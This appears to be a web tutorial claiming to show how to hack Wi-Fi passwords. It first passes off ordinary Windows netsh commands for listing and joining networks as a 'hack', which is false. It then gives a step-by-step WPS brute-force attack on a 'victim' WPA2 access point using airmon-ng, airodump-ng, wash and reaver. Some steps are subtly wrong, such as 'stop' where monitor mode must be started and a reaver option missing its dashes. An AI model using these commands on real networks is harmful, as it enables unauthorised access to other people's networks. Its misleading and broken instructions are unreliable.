Steps to Hack Wifi password using cmd :
1: Open command prompt by going to start and click on run command or enter windows+r, then type cmd and hit Enter
2: In command prompt window, type
netsh wlan show network mode=bssid
3: This command will show all the available WiFi network in your area
4: This is the last step. Just type :
netsh wlan connect name=(wifi name )
netsh wlan connect name= e.g Myname Sata1
and you will be connected to that WiFi network.
5: To disconnect it, type
netsh wlan disconnect

Tr5 Steps Wifi Hacking  Cracking WPA2 Password:

1. Open our terminal (CTRL+ALT+T) and type airmon-ng (view tips and tricks how to create keyboard shortcut on kali linux)


this command will lists our wireless card that attached with our system.

2. The next step we need to stop our wireless monitor mode by running airmon-ng stop wlan0


3. Now we ready to capture the wireless traffic around us. By running airodump-ng wlan0 our wireless interface will start capturing the data.


From the picture above, we can see many available access point with all the information. In the green box is our victim access point which is my own access point

Information:

BSSID (Basic Service Set Identification): the MAC address of access point

PWR: Signal level reported by the card.

Beacons: Number of announcements packets sent by the AP

#Data: Number of captured data packets (if WEP, unique IV count), including data broadcast packets.

#/s: Number of data packets per second measure over the last 10 seconds.

CH: Channel number (taken from beacon packets).

MB: Maximum speed supported by the AP. If MB = 11, it's 802.11b, if MB = 22 it's 802.11b+ and higher rates are 802.11g.

ENC: Encryption algorithm in use.

CIPHER: The cipher detected. TKIP is typically used with WPA and CCMP is typically used with WPA2.

AUTH: The authentication protocol used.

ESSID: Shows the wireless network name. The so-called SSID, which can be empty if SSID hiding is activated.

4. From the step 3 above, we can find access point with encryption algorithm WPA2 and note the AP channel number. Now we will find out whether target AP has WPS enabled or not.

wash -i wlan0 -c 8 -C -s


if the WPS Locked status is No, then we ready to crack and move to step 5.

5. The last step is cracking the WPA2 password using reaver.

reaver -i <your_interface> -b <wi-fi victim MAC address> fail-wait=360

Because we already get the information from step 3 above, so my command look like this:

reaver -i wlan0 -b E0:05:C5:5A:26:94 fail-wait=360


it took about 5 hours to crack 19 characters WPA2 password (vishnuvalentino.com) from my Kali virtualBox, but it depend with our hardware and wireless card.
